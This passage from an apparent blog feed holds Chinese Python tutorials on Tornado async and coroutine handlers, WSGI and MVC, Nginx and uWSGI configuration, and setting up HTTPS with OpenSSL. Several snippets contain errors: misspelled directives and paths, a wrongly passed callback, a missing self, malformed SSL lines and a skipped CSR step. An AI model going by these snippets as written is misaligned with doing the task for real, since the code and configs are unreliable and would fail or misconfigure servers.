RequestHandler.clear_all_cookies</p><p>​    清空本次请求中的所有Cookie。</p><h4 id="异步化及协程化"><a href="#异步化及协程化" class="headerlink" title="异步化及协程化"></a>异步化及协程化</h4><p>​    上述例子都是用同步的方法来处理用户的请求，即在RequestHandler的get()和post()函数中完成所有的处理，当退出get()和post()等函数后马上向客户端返回Response。但是处理逻辑比较复杂或需要等待外部I/O时，这样的处理机制会阻塞服务器线程，并不适合大量客户端高并发的应用场景。</p><p>​    Tornado有两种方式改变同步的处理流程。</p><ul><li>异步化：针对RequestHandler的处理函数，使用@tornado.web.asynchronous修饰器，将默认的同步机制改为异步机制。</li><li>协程化：针对RequestHandler的处理函数，使用@tornado.gen.coroutine修饰器，将默认的同步机制改为协程机制。</li></ul><ol><li><p><strong>异步化</strong></p><p>异步化的RequestHandler处理如下：</p></li></ol><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.httpclient</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.asynchronous</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        http = tornado.httpclient.AsyncHTTPClient()</span><br><span class="line">        http.fetch(<span class="string">"http://www.baidu.com"</span>,callback=self.on_respinse())</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_resoponse</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> response.error:<span class="keyword">raise</span> tornado.web.HTTPError(<span class="number">500</span>)</span><br><span class="line">        self.write(response.body)</span><br><span class="line">        self.finish()</span><br></pre></td></tr></tbody></table></figure><p>​    本例中用装饰器tornado.web.asynchronous定义了HTTP访问处理函数get()。这样，当get()函数返回时，对该HTTP访问的请求尚未完成，所以Tornado无法发送HTTP Response给客户端。只有当在随后的on_response()中的finish()函数被调用时，Tornado才知道本次处理已完成，可以发送给Response给客户端。</p><p>​    异步编程虽然提高了服务器的并发能力，但编程方法繁琐。</p><p>  2.<strong>协程化</strong></p><p>​    协程的编程方法示例如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.httpclient</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.gen.coroutine</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">        http = tornado.httpclient.AsyncHTTPClient()</span><br><span class="line">        response = <span class="keyword">yield</span> http.fetch(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">        self.write(response.body)</span><br></pre></td></tr></tbody></table></figure><p>​    本例中展示仍然是一个转发网站内容的处理器，代码量与相应的同步版本差不多。协程化的关键技术点如下。</p><ul><li>用tornado.gen.coroutine装饰MainHandler的get()、post()等处理函数。</li><li>使用异步对象处理耗时操作，比如本例的AsyncHTTPClient。</li><li>调用yield关键字获取异步对象的处理结果。</li></ul></body></html>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tornado </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web服务器纵览</title>
      <link href="/2019/03/18/web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BA%B5%E8%A7%88/"/>
      <url>/2019/03/18/web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BA%B5%E8%A7%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="web框架概览"><a href="#web框架概览" class="headerlink" title="web框架概览"></a>web框架概览</h3><p><strong>1）网络框架及MVC架构</strong></p><p>​    MVC是软件工程中的一种软件架构设计模式，MVC把web应用系统分为如下3个基本部分：模型、视图、控制器，它们各自处理着自己的任务。几乎所有的Python全栈网络框架强制或引导开发者使用MVC架构开发Web应用。</p><p>注：全栈网络框架，是指除了封装网络和线程操作，还提供http栈，数据库的读写管理，HTML模板引擎等一系列功能的网络框架。</p><ul><li><p><img src="http://www.runoob.com/wp-content/uploads/2014/08/MVC1.png" alt="MVC结构">实现：创建一个作为模型的Student模型对象。StudentView是一个把学生详细信息输出到控制台的视图类，StudentController是负责存储数据到Student对象中的控制类，并相应地更新视图StudentView。MVCPatternDemo是使用StudentController来演示MVC模式用法的演示类。</p><p><img src="http://www.runoob.com/wp-content/uploads/2014/08/mvc_pattern_uml_diagram.jpg" alt></p></li><li><p>模型（Model），用于封装与应用程序业务逻辑相关数据的处理，Model层是Web应用程序中处理应用程序的数据逻辑部分。换言之，模型表示企业数据和业务规则（大白话就是后端接口，用于业务处理）。</p></li><li><p>视图（View），负责数据的展示与呈现。</p></li><li><p>控制器（Controller），负责接受用户的输入并调用模型和视图去完成用户的需求，控制器本身不输出任何东西和做任何处理。它只是接收请求并决定调用哪个模型构件去处理请求，然后再确定用哪个视图来显示返回的数据。（可以看做是View的反向实现）</p><p><img src="http://a3.qpic.cn/psb?/V11LBpl80UoTHW/Y09f64qra1tZo7bDu3bewbNiAHXlH4*.mHEj6M7RhWA!/m/dL4AAAAAAAAAnull&bo=tAL.AQAAAAARB3k!&rf=photolist&t=5" alt></p><p>当前的主流服务器都实现了主流语言的可调用接口标准，有如下标准。</p><ol><li><p>CGI（Common Gateway Interface），CGI规范允许Web服务器执行外部程序，并将它们的输出发送给Wb服务器，CGI将Web的一组简单的静态超媒体文档变成一个完整的新交互式媒体。</p></li><li><p>ISAPI（Internet Server Application Program Interface）是微软提供的一套面向Web服务的API接口，它能实现CGI提供的全部功能，并在此基础上进行了扩展（比如提供了过滤应用程序的接口）。</p></li><li><p>WSGI（Web Server Gateway Interface）是一套专门为Python语言制定的网络服务器标准接口。Python Web框架均以WSGI为基础构建。</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/cUYa.3fv0UIrm3YQQSjxsPlsVMVdELpbNPNdTQpTKp8!/b/dL4AAAAAAAAA&bo=oQGTAaEBkwEDByI!&rf=viewer_4" alt></p></li></ol><p>​       一般来说，最简单的服务器端程序可以是直接读取某文件或返回固定的网页内容；稍复杂一些的服务端程序需要处理客户端通过HTTP、URL、HTML传入的参数、动态的执行逻辑代码、在数据库或者缓存中读写数据等一系列操作，才能最终生成调用结果。</p><p>​    Web服务器是连接用户浏览器和Python服务器端程序的中间节点，在网站建立的过程中有着重要的作用。目前主流的Web服务器包括Nginx、Apache、lighthttpd、IIS等。Python服务端程序在Linux使用最广泛的是Nginx。</p><p><strong>2）WSGI接口</strong></p><p>​    WSGI是将Python服务器端程序连接到Web服务器的通用协议。由于WSGI的通用性，出现了独立的WSGI程序，例如uWSGI和Apache的mod_wsgi。</p><p><img src="http://m.qpic.cn/psb?/V11LBpl80UoTHW/dlvFIkYEGBlrUqtBDLNDV*Z.u9ez1g3jeOxgRNcT7p0!/b/dLkAAAAAAAAA&bo=LgG8AQAAAAADB7A!&rf=viewer_4" alt></p><p>​    由上图可知，WSGI的接口可分为两种：一个是与Web服务器接口，另一个是与服务器端程序的接口。WSGI Server与Web服务器的接口包括uwsgi、fastcgi等，服务器端程序的开发者无需学习此部分的详细内容，相反更应该关注WSGI与服务器端程序的接口。</p><p>​    虽然WSGI的设计目标是连接标准的Web服务器（Nginx，apache）与服务器端程序，但WSGI Server本身也可作为Web服务器运行（但WSGI性能方面不佳，WSGI Server一般只用于测试使用，不能用于正式运行）。</p></li></ul><h3 id="Linux-Nginx-uWSGI配-置"><a href="#Linux-Nginx-uWSGI配-置" class="headerlink" title="Linux+Nginx+uWSGI配 置"></a>Linux+Nginx+uWSGI配 置</h3><p>​    Nginx是Python在Linux环境下的首选Web服务器之一（通常作为高性能http和反向代理服务器，广泛运用于天猫、美团、腾讯等大厂），以下演示在Ubuntu Linux中演示Nginx的安装与配置方法。</p><p><strong>1) 安装Nginx</strong> </p><p>在Ubuntu Linux中可以通过如下命令安装Nginx：</p><p><code>sudo apt-get install nginx</code></p><p>安装程序把Nginx以服务的形式安装在系统中，相关的程序及文件路径如下。</p><ul><li>程序文件：放在/usr/sbin/nginx目录中。</li><li>全局配置文件：/etc/nginx/nginx.conf。</li><li>访问日志文件：/var/log/nginx/access.log。</li><li>错误日志文件：/var/log/nginx/err.log。</li><li>站点配置文件：/etc/nginx/sites-enabled/default。</li></ul><p>安装好了，用如下命令启动Nginx服务器：</p><p><code>sudo service nginx start</code></p><p>停止Nginx服务器：</p><p><code>sudo service nginx stop</code></p><p> 查看Nginx服务的状态：</p><p><code>sudo service nginx status</code></p><p>重启Nginx服务器：</p><p><code>sudo service nginx restart</code></p><p><strong>2) Nginx配置文件</strong></p><p>​    Nginx安装后会以默认方式启动，在开发调试的过程中可能需要调整Nginx的运行参数，这些运行参数会通过全局配置文件(nginx.conf)和站点配置文件(sites-enabled)进行设置，对全局配置文件(/etc/nginx/nginx.conf)中的关键可设置参数解析如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">user www-data; ##定义运行Nginx的用户</span><br><span class="line">worker_processes 4; ##Nginx进程数，应设置与系统CPU数量相等的数值</span><br><span class="line">worker_rlimit_nofile 65535;                  ##每个Nginx进程可以打开的最大文件数</span><br><span class="line">events{</span><br><span class="line">    worker_connections 768;                  ##每个Nginx进程允许的最大客户端连接数</span><br><span class="line">    </span><br><span class="line">    #在Nginx接到一个新连接通知后调用accept()来接受尽量多的连接</span><br><span class="line">    multi_accept off;</span><br><span class="line">}</span><br><span class="line">http{</span><br><span class="line">    ##</span><br><span class="line">    # Basic Settings</span><br><span class="line">    ##</span><br><span class="line">    sendfile on;  ##是否允许文件上传</span><br><span class="line">    client_header_buffer_size 32K;  ##上传文件大小限制</span><br><span class="line">    tcp_nopush on;  ##防止网络拥塞</span><br><span class="line">    tcp_nodelay on;                           ##防止网络拥塞</span><br><span class="line">    keepalive_timeout 65;  ##允许客户端长连接最大秒数</span><br><span class="line">    </span><br><span class="line">    ##Nginx散列表大小。本值越大，占用的内存空间越大，但路由速度很快</span><br><span class="line">    types_hash_max_size 2048;</span><br><span class="line">    </span><br><span class="line">    access_log /var/log/nginx/access.log;  ##访问日志文件路径名</span><br><span class="line">    error_log  /var/log/nginx/error.log;      ##错误日志文件路径名</span><br><span class="line">    </span><br><span class="line">    ## 如下两条用include命令加载站点配置文件</span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">    include /etc/ngigx/sites-enabled/*; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>​    在每个Nginx服务器中可以运行多个Web站点。每个站点的配置通过站点配置文件设置。每个站点应该以一个单独的配置文件存放在/etc/nginx/sites-enabled目录中，默认站点的配置文件名为/etc/nginx/sites-default，对其中关键内容的解析如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">server{</span><br><span class="line">    ##配置站点监听的端口</span><br><span class="line">    listen 80;</span><br><span class="line">    </span><br><span class="line">    root /usr/share/nginx/html;  ##配置HTTP根页面目录</span><br><span class="line">    index index.html index.htm;  ##配置HTTP根目录中的默认页面</span><br><span class="line">    </span><br><span class="line">    #站点监听的IP地址，默认的localhost只可用于本机访问，一般需要将其更改为真实IP</span><br><span class="line">    sever_name localhost;</span><br><span class="line">    </span><br><span class="line">    ##location用于配置URL的转发接口</span><br><span class="line">    location /user/{</span><br><span class="line">        ##此处配置http://server_name/user/的转发地址</span><br><span class="line">        proxy_pass http://127.0.0.1:8080;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    #错误页面配置，如下配置定义HTTP 404错误的显示页面 /404.html</span><br><span class="line">    error_page 404 /404.html;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>3) 安装uWSGI及配置</strong> </p><p>​    uWSGI是WSGI在Linux中的一种实现，这样开发者无需自己编写WSGI Server。使用pip命令可以直接安装uWSGI。</p><p><code>pip install uwsgi</code></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">wjq@Ubuntu:~/TornadoWork/tornado_0/temp/cha5$ uwsgi --http-socket :9090 --plugin python --wsgi-file webapp.py</span><br><span class="line">open("./python_plugin.so"): No such file or directory [core/utils.c line 3724]</span><br><span class="line">!!! UNABLE to load uWSGI plugin: ./python_plugin.so: cannot open shared object file: No such file or directory !!!</span><br><span class="line">*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 11:23:32 2019] ***</span><br><span class="line">compiled with version: 4.8.4 on 16 March 2019 02:33:42</span><br><span class="line">os: Linux-4.4.0-124-generic #148~14.04.1-Ubuntu SMP Thu May 3 07:26:53 UTC 2018</span><br><span class="line">nodename: Ubuntu</span><br><span class="line">machine: x86_64</span><br><span class="line">clock source: unix</span><br><span class="line">detected number of CPU cores: 2</span><br><span class="line">current working directory: /home/wjq/TornadoWork/tornado_0/temp/cha5</span><br><span class="line">detected binary path: /usr/local/bin/uwsgi</span><br><span class="line">!!! no internal routing support, rebuild with pcre support !!!</span><br><span class="line">*** WARNING: you are running uWSGI without its master process manager ***</span><br><span class="line">your processes number limit is 11929</span><br><span class="line">your memory page size is 4096 bytes</span><br><span class="line">detected max file descriptor number: 1024</span><br><span class="line">lock engine: pthread robust mutexes</span><br><span class="line">thunder lock: disabled (you can enable it with --thunder-lock)</span><br><span class="line">uwsgi socket 0 bound to TCP address :9090 fd 3</span><br><span class="line">Python version: 2.7.12 (default, Jul 18 2016, 15:07:05)  [GCC 4.8.4]</span><br><span class="line">*** Python threads support is disabled. You can enable it with --enable-threads ***</span><br><span class="line">Python main interpreter initialized at 0x1a33880</span><br><span class="line">your server socket listen backlog is limited to 100 connections</span><br><span class="line">your mercy for graceful operations on workers is 60 seconds</span><br><span class="line">mapped 72920 bytes (71 KB) for 1 cores</span><br><span class="line">*** Operational MODE: single process ***</span><br><span class="line">WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1a33880 pid: 4554 (default app)</span><br><span class="line">*** uWSGI is running in multiple interpreter mode ***</span><br><span class="line">spawned uWSGI worker 1 (and the only) (pid: 4554, cores: 1)</span><br><span class="line">[pid: 4554|app: 0|req: 1/1] 59.68.29.48 () {32 vars in 590 bytes} [Sat Mar 16 11:47:29 2019] GET / => generated 20 bytes in 0 msecs (HTTP/1.1 200) 1 headers in 43 bytes (0 switches on core 0)</span><br><span class="line">[pid: 4554|app: 0|req: 2/2] 59.68.29.48 () {32 vars in 571 bytes} [Sat Mar 16 11:47:30 2019] GET /favicon.ico => generated 20 bytes in 0 msecs (HTTP/1.1 200) 1 headers in 43 bytes (0 switches on core 0)</span><br><span class="line">[pid: 4554|app: 0|req: 3/3] 59.68.29.48 () {32 vars in 571 bytes} [Sat Mar 16 11:47:38 2019] GET /favicon.ico => generated 20 bytes in 0 msecs (HTTP/1.1 200) 1 headers in 43 bytes (0 switches on core 0)</span><br></pre></td></tr></tbody></table></figure><p>​         <code>uwsgi --http-socket :9090 --plugin python --wsgi-file webapp.py</code>      </p><p>​    启动时用-http参数指定了监听端口，用–wsgi-file指定了服务端的程序名。如上所示，uWSGI在启动的过程中会输出系统的一些环境信息：服务器名、进程数限制、服务器硬件配置、最大文件句柄数等。除了在uWSGI 启动命令行提供配置参数，uWSGI 还允许通过一个配置文件设置这些配置参数，比如可以编写如下配置文件，保存在文件名uwsgi.ini中：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">http = 9090</span><br><span class="line">wsgi-file = webapp.py</span><br></pre></td></tr></tbody></table></figure><p>​    启动uWSGI时直接指定配置文件即可。</p><p><code>uwsgi uwsgi.ini</code></p><p>除了http和wsgi-file参数，uWSGI还有许多其他参数，常用的如下。</p><ul><li><p>socket: 以WSGI的Socket方式运行，并指定连接地址和端口。该Socket接口是uWSGI与其他Web服务器（Nginx/Apache）等进行对接的方式。</p></li><li><p>chdir: 指定uWSGI 启动后的当前目录。</p></li><li><p>processes: 指定启动服务器端程序的进程数。</p></li><li><p>threads: 指定每个服务器端程序的线程数。即服务器端的总线程数为processes * threads。</p></li><li><p>uid: 指定运行uWSGI的Linux用户id。</p><p>举例，如下配置文件用于以Socket方式启动一个uWSGI服务器，并配置了进程和线程数。</p></li></ul><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">socket = 127.0.0.1: 3011</span><br><span class="line">wsgi-file = webapp.py</span><br><span class="line">processes = 4</span><br><span class="line">threads = 3</span><br></pre></td></tr></tbody></table></figure><p><strong>4) 集成Nginx与uWSGI</strong> </p><p>​    直接通过在站点配置文件中为location配置uwsgi_pass,即可将Nginx与uWSGI集成，建立一个基于Nginx+Python的正式站点。针对如下uWSGI接口有：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">socket = 127.0.0.1： 3011</span><br><span class="line">wsgi_file = webapp.py</span><br></pre></td></tr></tbody></table></figure><p>​    Nginx的站点配置文件为：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server{</span><br><span class="line">    listen 80;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 此处改为服务器的真实IP</span></span></span><br><span class="line">server_name 121.12.134.11;</span><br><span class="line">location /{</span><br><span class="line">    ## 此处IP与Port配置必须与uwsgi接口中参数相同</span><br><span class="line">    uwsgi_pass http://127.0.0.1:3011;</span><br><span class="line">}</span><br><span class="line">'''</span><br><span class="line">可以为一个uWSGI配置多个Nginx Server和location，这样就可以实现多域名访问同一个python程序。</span><br><span class="line">'''</span><br></pre></td></tr></tbody></table></figure><h3 id="建立安全的HTTPS网站"><a href="#建立安全的HTTPS网站" class="headerlink" title="建立安全的HTTPS网站"></a>建立安全的HTTPS网站</h3><p>​    大多数的HTTP站点的协议与数据以明文方式在网络上传输，而HTTPS（HyperText Transfer Protocol over Secure Socket Layer ）是以安全为目标的HTTP通道，即在HTTP下加入SSL层，通过SSL达到数据加密及身份认证的功能。目前大多数银行、证券、交通的网站均以HTTPS方式构建。</p><p>​    OpenSSL是一个强大的免费Socket层密码库，蕴含了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议。目前大多数网站通过OpenSSL工具搭建HTTPS站点，其步骤如下。</p><ul><li>在服务器中安装OpenSSL工具包。</li><li>生成SSL密钥和证书。</li><li>将证书配置到Web服务器。</li><li>在客户端安装CA证书。</li></ul><p>​       如下记录在Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-124-generic x86_64)下使用OpenSSL的方法，以及Nginx在Linux下的证书配置方式。类似Linux其他发行版、Windows方法类似。</p><p>​      <strong>1）在服务器中安装OpenSSL工具包</strong></p><p>​    通过如下两条命令安装OpenSSL：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">sudo apt-get install openssl</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sudo apt-get install libssl-dev</span></span><br></pre></td></tr></tbody></table></figure><pre><code>命令运行成功后，OpenSSL命令和配置文件将被安装到Linux系统目录中。</code></pre><ul><li><p>OpenSSL命令：/usr/bin/openssl。</p></li><li><p>配置文件：/usr/lib/ssl/*。</p><p><strong>2）生成SSL密钥和证书</strong> </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过如下步骤生成CA证书ca.crt、服务器密钥文件server.key和服务器证书server.crt:</span><br></pre></td></tr></tbody></table></figure></li></ul><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">生成CA密钥</span></span><br><span class="line">openssl genrsa -out ca.key 2048</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">生成CA证书，days参数以天为单位设置证书的有效期。在本过程中会要求输入证书的所在地、公司名、站点名等</span></span><br><span class="line">openssl req -x509 -new -nodes -key ca.key -days 365 -out ca.crt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">生成服务器证书RSA的密钥对</span></span><br><span class="line">openssl genrsa -out server.key 2048</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">生成服务器端证书ca.crt</span></span><br><span class="line">openssl x509 -req -in server.csr -CA ca.crt -CAKey ca.key -CAcreateserial -out server.crt -days 365</span><br></pre></td></tr></tbody></table></figure><p>​    上述命令生成服务器端证书时，需要在Common Name(CN)字段中如实输入站点的访问地址。即设若要访问<a href="http://www.abc.com进行访问，则必须定义CN=www.abc.com；如果通过IP地址访问，则需设置CN为具体的IP地址。" target="_blank" rel="noopener">www.abc.com进行访问，则必须定义CN=www.abc.com；如果通过IP地址访问，则需设置CN为具体的IP地址。</a></p><p>​        <strong>3）配置Nginx HTTPS服务器</strong> </p><p>​    在站点配置文件/etc/nginx/sites-enabled/default中添加如下server段，可以定义一个基于HTTPS的接口，该接口的服务器端程序仍旧为uWSGI接口127.0.0.1:3011。</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server{</span><br><span class="line">    listen443;#HTTPS服务端口</span><br><span class="line">    server_name0.0.0.0;        #本机上的所有IP地址</span><br><span class="line">    sslon;#</span><br><span class="line">    ssl_certificate/etc/nginx/ssl/server.crt;</span><br><span class="line">    ssl_certificate_key/etc/nginx/ssl/server.key;</span><br><span class="line"></span><br><span class="line">location \ {</span><br><span class="line">    uwsgi_pass http://127.0.0.1:3011;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>​    其中需要注意的参数ssl_certificate和ssl_certificate_key需要分别指定生成的服务器证书和服务器密钥的全路径文件名。到此，我们就可以使用浏览器访问服务器的443端口进行HTTPS加密通信了。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python多线程</title>
      <link href="/2019/03/16/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
      <url>/2019/03/16/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="Python多线程"><a href="#Python多线程" class="headerlink" title="Python多线程"></a>Python多线程</h3><h4 id="同步和异步概念和区别"><a href="#同步和异步概念和区别" class="headerlink" title="同步和异步概念和区别"></a>同步和异步概念和区别</h4><p>​    我们经常会看到同步、异步、阻塞、非阻塞四种调用方式以及它们的组合。那同步和异步的概念和区别又是什么呢？</p><p><strong>同步(Sync)</strong></p><p>​    同步的思想就是发出一个功能调用时，在没有得到结果之前，该调用就不返回或继续执行后续操作。 <strong>也就是说</strong>所有的操作都做完，才返回给用户。(会给人一种程序还在进行，卡死的感觉)，事情需要一件一件的做，等前一件做完了才能做下一件事。</p><p>​    举例:B/S模式中的表单提交，具体过程是：客户端提交请求->等待服务器处理->处理完毕返回，在这个过程中客户端（浏览器）不能做其他事。 </p><p><strong>异步(Async)</strong></p><p>​    异步与同步相对，当一个异步过程调用发出后，调用者在没有得到结果之前，就可以继续执行后续操作。当这个调用完成后，一般通过状态、通知和回调来通知调用者。对于异步调用，调用的返回并不受调用者控制。</p><p>​    对于通知调用者的三种方式，具体如下：</p><p>​        <strong>状态</strong></p><p>​    即监听被调用者的状态（轮询），调用者需要每隔一定时间检查一次，效率会很低。</p><p>​       <strong>通知</strong></p><p>​    当被调用者执行完成后，发出通知告知调用者，无需消耗太多性能。</p><p>​       <strong>回调</strong></p><p>​    与通知类似，当被调用者执行完成后，会调用调用者提供的回调函数。</p><p>​    举例:B/S模式中的ajax请求，具体过程是：客户端发出ajax请求->服务端处理->处理完毕执行客户端回调，在客户端（浏览器）发出请求后，仍然可以做其他的事。 </p><p><strong><em>同步和异步的区别:</em></strong>    </p><p>​    请求发出后，是否需要等待结果，才能继续执行其他操作。 </p><h4 id="多线程的动机"><a href="#多线程的动机" class="headerlink" title="多线程的动机"></a>多线程的动机</h4><p>​    在多线程(MT)编程出现之前，程序的运行由一个执行序列组成，执行序列按顺序在主机的中央处理器(CPU)中运行。无论是任务本身要求顺序执行还是整个程序是由多个子任务组成，程序都是按照这种方式执行的，即便子任务相互独立，互相无关(即，一个子任务的结果不影响其他子任务的结果)时也是这样。多线程的目的就是要并行运行这项相互独立的子任务，这样的并行处理可以大幅度的提升整个任务的效率。</p><p>​    多线程对于某些任务是最理想的，这些任务的特点是：<strong>它们本质上就是异步的，需要有多个并发事务，各个事务的运行程序可以是不确定的，随机的，不可预测的。</strong>这样的编程任务可以被分为多个执行流，每个流都要有一个要完成的目标。根据应用的不同，这些子任务可能都要计算出一个中间结果，用于合并得到最后的结果。</p><p>​    使用多线程编程和一个共享的数据结构如Queue（一种多线程队列数据结构），这种程序任务可以用几个功能单一的线程来组织:</p><ul><li><p>UserRequestThread：负责读取用户的输入，可能是一个I/O通道。程序可能创建多个线程</p><p>每个客户一个，请求会被放到队列中。</p></li><li><p>RequestProcessor：一个负责从队列中获取并处理请求的线程，它为下面那种线程提供输出。</p></li><li><p>ReplyThrea：负责把用户的输出取出来，如果是网络应用程序就把结果发送出去，否则就保存在本地系统或者数据库中。</p><p>把编程任务用多线程来组织可以降低程序的复杂度，并使得干净，有效和良好组织地程序结构的实现变得可能。并且每个线程的逻辑都不会很复杂，因为它要做的事很清楚。</p></li></ul><h4 id="线程和进程"><a href="#线程和进程" class="headerlink" title="线程和进程"></a>线程和进程</h4><h5 id="什么是进程？"><a href="#什么是进程？" class="headerlink" title="什么是进程？"></a>什么是进程？</h5><p>​    